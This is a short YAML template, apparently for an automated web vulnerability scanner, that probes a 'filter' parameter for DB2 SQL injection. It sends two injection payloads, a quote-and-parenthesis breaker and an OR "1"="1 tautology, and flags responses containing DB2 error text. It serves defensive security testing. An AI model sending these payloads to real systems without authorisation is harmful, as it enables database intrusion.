id: sqli3-db2-10
name: 'SQLi db2 prefix #9 in filter'
severity: high
type: active
tags:
  - sqli
  - injection
  - db2
description: 'Triggers db2 error via filter'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      filter:
        - '''))'
        - '1" OR "1"="1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLCODE'
          - 'DB2'
